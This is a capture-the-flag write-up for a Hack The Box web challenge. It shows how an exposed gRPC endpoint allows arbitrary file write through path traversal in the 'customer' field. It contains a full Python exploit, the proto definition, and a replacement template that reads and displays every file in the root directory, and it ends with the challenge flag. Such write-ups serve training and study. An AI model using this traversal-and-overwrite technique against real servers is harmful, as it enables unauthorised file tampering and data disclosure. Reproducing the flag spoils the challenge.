# Testimonial

As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction's hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.

## Writeup

The site interact with a **gRPC** server, that has the port exposed.

If we interact with the **gPRC** server by the site, we have this additional check:

```go
func (c *Client) SendTestimonial(customer, testimonial string) error {
	ctx := context.Background()
	// Filter bad characters.
	for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
		customer = strings.ReplaceAll(customer, char, "")
	}

	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}
```

So we can use directly the port of **gPRC** to send our payload.

The **gPRC** server have a stub called **SubmitTestimonial** that is used to write an file inside **/public/testimonials** directory:

```go
func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
	if req.Customer == "" {
		return nil, errors.New("Name is required")
	}
	if req.Testimonial == "" {
		return nil, errors.New("Content is required")
	}

	err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
	if err != nil {
		return nil, err
	}

	return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
}
```

So this application is vulnerable to **arbitrary file write**

We can use it to rewrite the **index.templ** file in order to print the flag:

```go
package home

import (
	"htbchal/view/layout"
	"io/fs"	
	"fmt"
	"os"
)

templ Index() {
	@layout.App(true) {
        @Testimonials()
	}
}

func GetTestimonials() []string {
	fsys := os.DirFS("/")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

templ Testimonials() {
  for _, item := range GetTestimonials() {
    <div class="col-md-4">
        <div class="card mb-4">
            <div class="card-body">
                <p class="card-text">"{item}"</p>
            </div>
        </div>
    </div>
  }
}
```

Write the **ptypes.proto** file:

```proto
syntax = "proto3";

option go_package = "/pb";

service RickyService {
    rpc SubmitTestimonial(TestimonialSubmission) returns (GenericReply) {}
}

message TestimonialSubmission {
    string customer = 1;
    string testimonial = 2;
}

message GenericReply {
    string message = 1;
}
```

Launch this command to generate the python code to interact with **gRPC**:

```bash
python -m grpc_tools.protoc --proto_path=. ./ptypes.proto --python_out=. --grpc_python_out=.
```

Now we have **ptypes_pb2_grpc.py** and **ptypes_pb2.py**, let's write the exploit:

```python
import grpc
import ptypes_pb2_grpc as pb2_grpc
import ptypes_pb2 as pb2

payload = """
package home

import (
	"htbchal/view/layout"
	"io/fs"	
	"fmt"
	"os"
)

templ Index() {
	@layout.App(true) {
        @Testimonials()
	}
}

func GetTestimonials() []string {
	fsys := os.DirFS("/")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

templ Testimonials() {
  for _, item := range GetTestimonials() {
    <div class="col-md-4">
        <div class="card mb-4">
            <div class="card-body">
                <p class="card-text">"{item}"</p>
            </div>
        </div>
    </div>
  }
}
"""

class PtypesClient(object):
    """
    Client for gRPC functionality
    """

    def __init__(self):
        self.host = 'localhost'
        self.server_port = 50045

        # instantiate a channel
        self.channel = grpc.insecure_channel(
            '{}:{}'.format(self.host, self.server_port))

        # bind the client and the server
        self.stub = pb2_grpc.RickyServiceStub(self.channel)

    def get_url(self, customer, testimonial):
        """
        Client function to call the rpc for SubmitTestimonial
        """
        message = pb2.TestimonialSubmission(customer=customer, testimonial=testimonial)
        print(f'{message}')
        return self.stub.SubmitTestimonial(message)


if __name__ == '__main__':
    client = PtypesClient()

    filename = "../../view/home/index.templ"

    result = client.get_url(customer=filename, testimonial=payload)
    print(f'{result}')
```

Now go to the site and the flag is:

```
HTB{w34kly_t35t3d_t3mplate5}
```